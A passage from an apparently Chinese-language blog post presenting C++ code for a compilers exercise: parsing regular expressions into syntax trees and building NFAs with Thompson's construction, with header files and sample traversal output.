class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../ds/Tree.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;e2t.h&quot;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//模块全局变量,用于多个函数之间通信</span></span><br><span class="line"><span class="type">static</span> <span class="built_in">string</span> expression;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> pos;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> Invalid;</span><br><span class="line"><span class="comment">// TreeNode和Tree为二叉树数据结构</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//以下函数都是测试字符性质</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isOr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> c == <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isJoin</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> c == <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isClosure</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> c == <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isLeftBracket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> c == <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isRightBracket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> c == <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isEnd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> expression[pos] == <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> <span class="title function_">getCurrentOperator</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> expression[pos];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isAlpha</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isCharacter</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isAlpha(c))<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> c!=<span class="string">&#x27;.&#x27;</span>&amp;&amp;c!=<span class="string">&#x27;|&#x27;</span>&amp;&amp;c!=<span class="string">&#x27;(&#x27;</span>&amp;&amp;c!=<span class="string">&#x27;)&#x27;</span>&amp;&amp;c!=<span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isNull</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isSpace</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> c == <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Tree <span class="title function_">getTree</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;str)</span> <span class="comment">//传递一个str表达式,构建一个语法树并返回相应二叉树实例</span></span><br><span class="line">&#123;                               <span class="comment">//消除空格,添加点号</span></span><br><span class="line">    <span class="built_in">string</span> <span class="built_in">exp</span>;</span><br><span class="line">    <span class="built_in">string</span> removeSpace = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> c : str)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (isSpace(c))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        removeSpace += c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> length = removeSpace.length();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (isAlpha(removeSpace[i]) &amp;&amp; i &gt; <span class="number">0</span> &amp;&amp; isAlpha(removeSpace[i - <span class="number">1</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">exp</span> += <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exp</span> += removeSpace[i];</span><br><span class="line">    &#125;</span><br><span class="line">    expression = <span class="built_in">exp</span>;</span><br><span class="line">    Invalid = <span class="number">0</span>;</span><br><span class="line">    pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> Tree(evalOr());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TreeNode *<span class="title function_">evalOr</span><span class="params">()</span> <span class="comment">//顶层函数,将表达式视为若干项目的或</span></span><br><span class="line">&#123;</span><br><span class="line">    TreeNode *joinTerm = <span class="literal">NULL</span>;</span><br><span class="line">    TreeNode *root = <span class="literal">NULL</span>;</span><br><span class="line">    TreeNode *assist = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span> op = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    joinTerm = evalJoin();</span><br><span class="line">    <span class="keyword">if</span> (Invalid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    root = joinTerm;</span><br><span class="line">    <span class="keyword">while</span> (!isEnd())</span><br><span class="line">    &#123;</span><br><span class="line">        op = getCurrentOperator();</span><br><span class="line">        <span class="keyword">if</span> (!isOr(op))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        ++pos;</span><br><span class="line">        joinTerm = evalJoin();</span><br><span class="line">        <span class="keyword">if</span> (Invalid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        assist = root;</span><br><span class="line">        root = new TreeNode(op, assist, joinTerm);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TreeNode *<span class="title function_">evalJoin</span><span class="params">()</span> <span class="comment">//二层函数,将局部表达式视为若干项目的连接</span></span><br><span class="line">&#123;</span><br><span class="line">    TreeNode *clousureTerm = <span class="literal">NULL</span>;</span><br><span class="line">    TreeNode *root = <span class="literal">NULL</span>;</span><br><span class="line">    TreeNode *assist = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span> op = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    clousureTerm = evalClosure();</span><br><span class="line">    <span class="keyword">if</span> (Invalid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    root = clousureTerm;</span><br><span class="line">    <span class="keyword">while</span> (!isEnd())</span><br><span class="line">    &#123;</span><br><span class="line">        op = getCurrentOperator();</span><br><span class="line">        <span class="keyword">if</span> (!isJoin(op))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        ++pos;</span><br><span class="line">        clousureTerm = evalClosure();</span><br><span class="line">        <span class="keyword">if</span> (Invalid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        assist = root;</span><br><span class="line">        root = new TreeNode(op, assist, clousureTerm);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TreeNode *<span class="title function_">evalClosure</span><span class="params">()</span> <span class="comment">//底层函数,将局部表达式视为括号或者树,并且判断是否有星闭包</span></span><br><span class="line">&#123;</span><br><span class="line">    TreeNode *joinTerm;</span><br><span class="line">    TreeNode *singleTerm;</span><br><span class="line">    TreeNode *root;</span><br><span class="line">    TreeNode *assist;</span><br><span class="line">    <span class="type">char</span> op;</span><br><span class="line"></span><br><span class="line">    op = getCurrentOperator();</span><br><span class="line">    <span class="keyword">if</span> (isLeftBracket(op))</span><br><span class="line">    &#123;</span><br><span class="line">        ++pos;</span><br><span class="line">        joinTerm = evalOr();</span><br><span class="line">        op = getCurrentOperator();</span><br><span class="line">        <span class="keyword">if</span> (!isRightBracket(op))</span><br><span class="line">        &#123;</span><br><span class="line">            Invalid = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        root = joinTerm;</span><br><span class="line">        ++pos;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        singleTerm = new TreeNode(op);</span><br><span class="line">        ++pos;</span><br><span class="line">        root = singleTerm;</span><br><span class="line">    &#125;</span><br><span class="line">    op = getCurrentOperator();</span><br><span class="line">    <span class="keyword">if</span> (!isClosure(op))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    ++pos; <span class="comment">//越过闭包星号</span></span><br><span class="line">    assist = root;</span><br><span class="line">    root = new TreeNode(op, assist);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//测试存根</span></span><br><span class="line"><span class="comment">// int main()</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     string exp = &quot;a  |(b.  c)*|d e&quot;;//测试正规式子</span></span><br><span class="line"><span class="comment">//     Tree tree = getTree(exp);//</span></span><br><span class="line"><span class="comment">//     tree.postOrder();</span></span><br><span class="line"><span class="comment">//     tree.inOrder();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     return 0;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>
<p>编译运行</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a b c . * | d e . | <span class="comment">#后根遍历</span></span><br><span class="line">a | b . c * | d . e	<span class="comment">#中根遍历</span></span><br></pre></td></tr></table></figure>
<p>与教具给出的二叉树图是一样的</p>
<h2 id="t2n">t2n</h2>
<p>tree to nfa</p>
<p>NFA是一个有向图,可以以Graph为基类</p>
<h3 id="t2n.h">t2n.h</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../ds/Graph.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../ds/Tree.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="type">int</span>,<span class="type">int</span>&gt; handle;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NFA</span>:</span>public Graph&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> toJudge;</span><br><span class="line">    <span class="type">int</span> tot_length;</span><br><span class="line">    <span class="type">int</span> start;</span><br><span class="line">    <span class="type">int</span> finish;</span><br><span class="line"></span><br><span class="line">    NFA(Tree &amp;);</span><br><span class="line">    handle <span class="title function_">subNFA</span><span class="params">(TreeNode *)</span>;</span><br><span class="line">    <span class="type">bool</span> <span class="title function_">backtracing_judge</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;expression)</span>;</span><br><span class="line">    <span class="type">bool</span> <span class="title function_">backtracing_judge</span><span class="params">(<span class="type">int</span> current_node,<span class="type">int</span> current_index)</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">getEpsilon</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; T)</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">smove</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; S,<span class="type">char</span> character)</span>;</span><br><span class="line">    <span class="type">bool</span> <span class="title function_">no_backtracing_judge</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;str)</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="t2n.cpp">t2n.cpp</h3>
<p>主要逻辑,就是一共getNFA递归函数,使用了汤普森算法</p>
<p>该函数接收一个语法树根,根据该根节点中的符号指示,决定如何建立子图,返回当前子图</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../e2t/e2t.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;t2n.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// #define start(handle) (handle.first)</span></span><br><span class="line"></span><br><span class="line">NFA::<span class="built_in">NFA</span>(Tree &amp;tree)</span><br><span class="line">&#123;</span><br><span class="line">    handle p = <span class="built_in">subNFA</span>(tree.root);</span><br><span class="line">    start = p.first;</span><br><span class="line">    finish = p.second;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">handle <span class="title">NFA::subNFA</span><span class="params">(TreeNode *o)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> sta = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> fin = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> op = o-&gt;<span class="built_in">getOp</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isCharacter</span>(op) || <span class="built_in">isNull</span>(op))</span><br><span class="line">    &#123;</span><br><span class="line">        sta = <span class="built_in">newNode</span>();</span><br><span class="line">        fin = <span class="built_in">newNode</span>();</span><br><span class="line">        nodes[sta].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(sta, fin, op));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isOr</span>(op))</span><br><span class="line">    &#123;</span><br><span class="line">        sta = <span class="built_in">newNode</span>();</span><br><span class="line">        handle left = <span class="built_in">subNFA</span>(o-&gt;left);</span><br><span class="line">        handle right = <span class="built_in">subNFA</span>(o-&gt;right);</span><br><span class="line">        fin = <span class="built_in">newNode</span>();</span><br><span class="line">        nodes[sta].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(sta, left.first, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">        nodes[sta].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(sta, right.first, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">        nodes[right.second].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(right.second, fin, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">        nodes[left.second].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(left.second, fin, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isJoin</span>(op))</span><br><span class="line">    &#123;</span><br><span class="line">        handle left = <span class="built_in">subNFA</span>(o-&gt;left);</span><br><span class="line">        --cnt_nodes;</span><br><span class="line">        handle right = <span class="built_in">subNFA</span>(o-&gt;right);</span><br><span class="line">        sta = left.first;</span><br><span class="line">        fin = right.second;</span><br><span class="line">        <span class="comment">// nodes[left.second].addEdge(newEdge(left.second,right.first,&#x27;\0&#x27;));</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isClosure</span>(op))</span><br><span class="line">    &#123;</span><br><span class="line">        sta = <span class="built_in">newNode</span>();</span><br><span class="line">        handle sub = <span class="built_in">subNFA</span>(o-&gt;left);</span><br><span class="line">        fin = <span class="built_in">newNode</span>();</span><br><span class="line">        nodes[sta].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(sta, sub.first, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">        nodes[sta].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(sta, fin, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">        nodes[sub.second].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(sub.second, sub.first, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">        nodes[sub.second].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(sub.second, fin, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;invalid operator&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">handle</span>(sta, fin);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">NFA::backtracing_judge</span><span class="params">(<span class="type">const</span> string &amp;expression)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    toJudge = expression;</span><br><span class="line">    tot_length = toJudge.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">backtracing_judge</span>(start,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">NFA::backtracing_judge</span><span class="params">(<span class="type">int</span> current_node, <span class="type">int</span> current_index)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="type">bool</span> flag;</span><br><span class="line">    GraphNode &amp;node=nodes[current_node];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(current_index==tot_length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(current_node==finish)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> e:node.postEdges)&#123;</span><br><span class="line">            GraphEdge &amp;edge=edges[e];</span><br><span class="line">            c=edge.<span class="built_in">getCharacter</span>();</span><br><span class="line">            <span class="keyword">if</span>(c==<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">                flag=<span class="built_in">backtracing_judge</span>(edge.to,current_index);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span 